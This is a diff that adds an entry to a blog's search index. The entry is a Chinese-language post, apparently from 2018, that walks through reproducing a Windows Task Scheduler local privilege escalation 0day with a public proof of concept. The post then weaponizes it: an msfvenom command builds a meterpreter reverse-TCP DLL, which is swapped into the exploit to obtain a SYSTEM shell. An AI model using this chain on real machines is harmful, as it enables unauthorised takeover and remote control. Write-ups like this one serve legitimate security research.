@@ -3,6 +3,21 @@
   
     
     <entry>
+      <title>windows-提权0day-复现</title>
+      <link href="/2018/08/31/windows-%E6%8F%90%E6%9D%830day-%E5%A4%8D%E7%8E%B0/"/>
+      <url>/2018/08/31/windows-%E6%8F%90%E6%9D%830day-%E5%A4%8D%E7%8E%B0/</url>
+      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><embed src="//music.163.com/style/swf/widget.swf?sid=33856586&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"><p>win10中任务调度服务导出的函数没有验证调用者的权限，任意权限的用户调用该函数可以获取系统敏感文件的写权限，进而提权。影响范围：windows10，windows server 2016昨天群里的基友们都复现了一遍也都成功了，也有基友在windows8实验了发现了也能提权成功。</p><p><img src="https://s1.ax1x.com/2018/08/31/PvFIij.jpg" alt="PvFIij.jpg" border="0"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>准备工作：下载POC，windows 10 镜像，Process Explorer，CFF<br>POC：<a href="https://github.com/SandboxEscaper/randomrepo" target="_blank" rel="noopener">GitHub - SandboxEscaper/randomrepo: Repo for random stuff</a><br>windows10 ISO:msdn下载<br>Process Explorer：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer" target="_blank" rel="noopener">Process Explorer - Windows Sysinternals | Microsoft Docs</a><br>CFF:<a href="https://ntcore.com/?page_id=388" target="_blank" rel="noopener">Explorer Suite – NTCore</a></p><p>首先打开一个notepad<br><img src="https://s1.ax1x.com/2018/08/31/PvkMlt.md.png" alt=""><br>并没有什么不同，执行<br><img src="https://s1.ax1x.com/2018/08/31/PvFXeU.md.png" alt=""><br>带有子进程conhost和notepad的cmd.exe已经生成为SYSTEM！</p><h3 id="将其武器化"><a href="#将其武器化" class="headerlink" title="将其武器化"></a>将其武器化</h3><p>在kali执行 <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f dll &gt; ka.dll</code><br><img src="https://s1.ax1x.com/2018/08/31/PvFgQP.md.png" alt=""><br>移动到windows10<br><img src="https://s1.ax1x.com/2018/08/31/PvFjwF.md.png" alt=""><br>在CFF打开<code>ALPC-TaskSched-LPE.dll</code>替换其msf生成的dll，然后保存<br><img src="https://s1.ax1x.com/2018/08/31/PvFTWn.md.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/08/31/PvFqyV.md.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/08/31/PvFLLT.md.png" alt=""><br>kali中执行监听命令<br><img src="https://s1.ax1x.com/2018/08/31/PvFoJs.md.png" alt=""><br>windows 10中执行<br><img src="https://s1.ax1x.com/2018/08/31/PvFRL8.md.png" alt=""><br>返回kali可以发现已经成功的反弹了一个meterpreter，并且是system权限<br><img src="https://s1.ax1x.com/2018/08/31/PvFhdg.md.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/08/31/PvFfeS.md.png" alt=""></p><p>分析此0day的文章：<a href="https://www.anquanke.com/post/id/158293" target="_blank" rel="noopener">漏洞预警 | Windows 10本地提权0day预警 - 安全客，安全资讯平台</a><br>转载请注明来自：422926799.github.io</p>]]></content>
+      
+      
+        <tags>
+            
+            <tag> Writing </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>文件巴士破解</title>
       <link href="/2018/08/29/%E6%96%87%E4%BB%B6%E5%B7%B4%E5%A3%AB%E7%A0%B4%E8%A7%A3/"/>
       <url>/2018/08/29/%E6%96%87%E4%BB%B6%E5%B7%B4%E5%A3%AB%E7%A0%B4%E8%A7%A3/</url>
